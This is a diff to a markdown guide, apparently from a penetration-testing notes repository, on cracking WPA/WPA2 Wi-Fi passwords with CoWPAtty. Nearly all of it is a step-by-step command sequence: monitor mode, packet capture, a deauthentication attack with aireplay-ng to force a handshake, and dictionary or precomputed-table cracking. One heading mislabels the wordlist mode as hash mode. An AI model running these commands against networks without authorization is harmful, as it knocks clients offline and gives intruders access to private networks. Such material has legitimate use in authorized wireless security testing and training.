@@ -1,44 +1,70 @@
 # CoWPAtty Attack (WPA/WPA2)
 
-Use CoWPAtty to crack the password in either dictionary mode (plaintext) or hash mode. The latter is quicker.
+Use CoWPAtty to crack the password in either dictionary/wordlist mode (plaintext) or hash/rainbow. The latter is quicker.
+
+## Installation
+
+```bash
+# Install cowpatty/genpmk
+sudo apt-get update
+sudo apt-get install cowpatty -y
+```
 
 ## Commands
 
 * Run [setup](../../setup.md) first
+* Two terminals are needed
+* At least on client associated with the AP
 
 ```bash
-# Install cowpatty/genpmk
-sudo apt-get install cowpatty
+# [Terminal One]
+# Set interface to monitor mode
+sudo airmon-ng start $INTERFACE
 
-# Start monitor mode
-sudo airmon-ng start wlan0
+# Start monitoring - make terminal large enough to see everything
+sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE
 
-# Start a screen session with a horizonal split screen
-
-# Start monitor mode but with filters and output saved to PCAP.
-sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap wlan0mon
-
-# Do one deauth injection attack while still monitoring
-sudo aireplay-ng -0 1 -a $BSSID -c $CLIENT wlan0mon
+# [Terminal Two]
+# Run the deauthentication attack to get four-way handshake
+sudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE
 
 # Wait for the four-way handshake to appear in airodump-ng window.
+
 # Stop airodump-ng when it appears
 qq
 
 # Check if four-way handshake is indeed valid
 cowpatty -r $PCAP -c
+```
 
-# Crack the password in dictionary mode (slowest)
+![cowpatty-check](../../images/cowpatty-check.png)
+
+## WORDLIST Mode
+
+* Crack the password in hash mode (slowest)
+
+```bash
+# Crack the password in dictionary mode
+# Cowpatty running wordlist is slower than aircrack-ng
 cowpatty -r $PCAP -f $WORDLIST -s $SSID
+```
 
-# Crack the password in hash mode (fastest)
+![cowpatty-check](../../images/cowpatty-crack.png)
 
-## Generate a RAINBOW table using a wordlist and filter by SSID
+## RAINBOW Mode
+
+* Crack the password in hash mode (fastest)
+
+```bash
+# Need to first generate a RAINBOW table based on a provided WORDLIST/SSID
 genpmk -f $WORDLIST -d $RAINBOW -s $SSID
 
 ## Crack the password with the RAINBOW table and filter by SSID
 cowpatty -r $PCAP -d $RAINBOW -s $SSID
 ```
+
+![cowpatty-check](../../images/cowpatty-crack-rainbow.png)
+
 ## References
 
 * [cowpatty](https://www.willhackforsushi.com/?page_id=50)
@@ -83,3 +109,4 @@ After precomputing the hash file, run cowpatty with the -d argument.
 * [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
 * [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
 * [Cowpatty](https://www.willhackforsushi.com/?page_id=50)
+* [Rainbow Tables](https://en.wikipedia.org/wiki/Rainbow_table)
